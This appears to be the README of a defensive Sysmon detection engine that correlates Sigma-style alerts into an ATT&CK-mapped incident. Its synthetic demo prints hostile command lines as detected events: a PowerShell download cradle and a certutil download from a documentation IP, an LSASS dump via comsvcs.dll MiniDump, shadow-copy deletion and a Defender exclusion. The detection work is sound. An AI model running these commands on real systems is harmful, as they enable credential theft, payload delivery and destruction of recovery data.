# Sysmon Detection Engine — Sigma-style rules, process-tree correlation and ATT&CK mapping

A detection engine for Windows **Sysmon** logs. It runs YAML detection rules written in a **Sigma-compatible** format, decodes obfuscated PowerShell, rebuilds the **process tree**, and groups alerts into **incidents** that show how an attack progressed through MITRE ATT&CK. It can export an **ATT&CK Navigator** layer.

![Python](https://img.shields.io/badge/Python-3.9%2B-blue?logo=python) ![Rules](https://img.shields.io/badge/rules-14-informational) ![Techniques](https://img.shields.io/badge/ATT%26CK%20techniques-17-red) ![Tests](https://img.shields.io/badge/tests-14%20passing-success)

## Why

A SIEM full of single alerts tells an analyst *something happened*. What they actually need to know is **which alerts belong to the same attack, where it started, and how far it got**. This engine answers that by linking every alert back to the process that caused it through Sysmon's `ProcessGuid` / `ParentProcessGuid` chain.

## Demo: one phishing document, fifteen alerts, one incident

`samples/attack_chain.jsonl` simulates a macro-based intrusion on `WS-FIN-07` hidden among benign activity on three hosts. The benign events include look-alikes that the rules must ignore: Defender reading LSASS, OneDrive's Run key, an installer creating a scheduled task, and an admin's `whoami`.

```
$ python hunt.py samples/attack_chain.jsonl
 Events: 65   Hosts: 3   Rules loaded: 14   Alerts: 15   Incidents: 1

 10:02:09  HIGH     PowerShell Download Cradle                    T1059.001, T1105
           WS-FIN-07.corp.local: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3...
           decoded -enc payload: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.10/a.
 ...
 10:07:01  CRITICAL Suspicious Process Access to LSASS            T1003.001
           WS-FIN-07.corp.local: rundll32.exe -> lsass.exe (0x1fffff)
 10:09:00  CRITICAL Volume Shadow Copy Deletion or Recovery Disa  T1490

 INCIDENT 1: WS-FIN-07.corp.local   severity=CRITICAL   risk score=510   alerts=15
 Attack progression: initial-access -> execution -> defense-evasion -> command-and-control
                     -> discovery -> persistence -> credential-access -> impact
 Process tree (launched by explorer.exe):
   WINWORD.EXE  [... /n "C:\Users\a.sharma\Downloads\Invoice_Nov.docm"]
   `-- powershell.exe  [-nop -w hidden -enc SQBFAFgA...]   <== Office Application Spawning Script Interpreter (+4 more)
       |-- certutil.exe  [-urlcache -split -f http://198.51.100.10/svc.exe ...]   <== Certutil Used to Download or Decode Files
       |-- cmd.exe
       |   |-- whoami.exe  [whoami /all]                         <== Account and Domain Discovery Commands
       |   |-- net.exe  [net group "domain admins" /domain]      <== Account and Domain Discovery Commands
       |   `-- nltest.exe  [nltest /domain_trusts]               <== Account and Domain Discovery Commands
       |-- schtasks.exe  [/create /tn "OneDriveUpdate" /tr "C:\Users\Public\svc.exe" ...]   <== Scheduled Task ...
       |-- powershell.exe  [Add-MpPreference -ExclusionPath C:\Users\Public]   <== Microsoft Defender ... Exclusion Added
       `-- svc.exe                                                <== File Dropped in Startup Folder
           |-- rundll32.exe  [comsvcs.dll, MiniDump 712 ...]      <== LSASS Dump via comsvcs.dll MiniDump (+1 more)
           `-- vssadmin.exe  [delete shadows /all /quiet]         <== Volume Shadow Copy Deletion ...
```

Result: **15 true-positive alerts, 0 false positives, all correlated into a single incident** with a readable attack story. The pattern (macro, then a PowerShell loader, credential theft, then shadow-copy deletion) is a classic ransomware precursor.

## Features

| Feature | Detail |
|---|---|
| Sigma-compatible rules | `contains`, `startswith`, `endswith`, `re`, `all` modifiers; wildcards; lists as OR; conditions with `and` / `or` / `not`, parentheses, `1 of sel_*`, `all of them` (recursive-descent parser) |
| Event ID scoping | Rules declare the Sysmon event IDs they apply to (1, 3, 10, 11, 13) |
| Enrichment | Decodes `powershell -EncodedCommand` (Base64, UTF-16LE) into `CommandLineDecoded`, so rules can see a hidden `DownloadString` |
| Process-tree correlation | Rebuilds parent/child links from `ProcessGuid`, including parents that started before logging began |
| Incidents | Alerts grouped by host and attack root process. Tactics ordered by when the attacker first reached them. Risk score = rule severity + number of tactic stages |
| Input formats | Flat JSON / JSONL, `evtx_dump` / python-evtx JSON, Winlogbeat (ECS) |
| Outputs | Colour console report, alerts JSON, MITRE ATT&CK Navigator layer |
| False-positive handling | Each rule carries documented `falsepositives` and explicit `filter_*` selections |

## Rule set (14 rules, 17 techniques)

| Level | Rule | ATT&CK |
|---|---|---|
| critical | Suspicious process access to LSASS (`GrantedAccess` 0x1010/0x1410/0x1fffff…) | T1003.001 |
| critical | LSASS dump via `comsvcs.dll MiniDump` | T1003.001 |
| critical | Shadow copy deletion / recovery disabled | T1490 |
| high | Office application spawning a script interpreter | T1566.001, T1204.002 |
| high | PowerShell encoded command | T1059.001, T1027 |
| high | PowerShell download cradle (incl. inside decoded `-enc`) | T1059.001, T1105 |
| high | Certutil download / decode (LOLBin) | T1105, T1140 |
| high | Mshta / Rundll32 running remote or script content | T1218.005, T1218.011 |
| high | Defender disabled or exclusion added | T1562.001 |
| high | Scheduled task pointing to a user-writable path | T1053.005 |
| high | Run-key persistence to a suspicious location | T1547.001 |
| medium | File dropped in a Startup folder | T1547.001 |
| medium | PowerShell connection to a public IP | T1071.001 |
| medium | Account / domain discovery commands | T1033, T1087.002, T1482 |

Example rule (`rules/process_access/lsass_access.yml`):

```yaml
title: Suspicious Process Access to LSASS
level: critical
tags: [attack.credential-access, attack.t1003.001]
logsource: {product: windows, service: sysmon, event_ids: [10]}
detection:
  target:
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess: ['0x1010', '0x1410', '0x1438', '0x143a', '0x1fffff']
  filter_security_tools:
    SourceImage|endswith: ['\MsMpEng.exe', '\csrss.exe', '\wininit.exe', '\svchost.exe']
  condition: target and not filter_security_tools
```

## Usage

```bash
pip install -r requirements.txt
python hunt.py samples/attack_chain.jsonl
python hunt.py events.jsonl --json alerts.json --navigator layer.json
python hunt.py --list-rules
python -m unittest discover -s tests
```

**Using real logs:** export Sysmon events with [`evtx_dump`](https://github.com/omerbenamram/evtx) (`evtx_dump -o jsonl Microsoft-Windows-Sysmon%4Operational.evtx > events.jsonl`) or ship them with Winlogbeat. Both formats are normalised automatically. Load `layer.json` into the [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) to see detected techniques (red) against rule coverage (blue).

## Project structure

```
hunt.py                 CLI and report
engine/rules.py         rule loader, field modifiers, condition parser
engine/events.py        input normalisation (flat / evtx_dump / Winlogbeat)
engine/enrich.py        PowerShell -EncodedCommand decoding
engine/correlate.py     detection, process tree, incident grouping and scoring
rules/                  14 YAML rules by Sysmon event category
samples/                simulated intrusion + generator + example Navigator layer
tests/                  14 unit and end-to-end tests
```

## Limitations and next steps

- Implements a practical subset of Sigma, not the full specification (no aggregation conditions like `count() > n`, no `base64offset` modifier).
- Correlation follows process lineage only. Lateral movement across hosts would need logon-session (`LogonGuid`) and network correlation, which is planned.
- Planned: run the public [Sigma rule repository](https://github.com/SigmaHQ/sigma) against [OTRF Security-Datasets](https://github.com/OTRF/Security-Datasets) recordings to measure detection coverage on real attack telemetry.

> The sample data is synthetic and uses RFC 5737 documentation IP addresses.
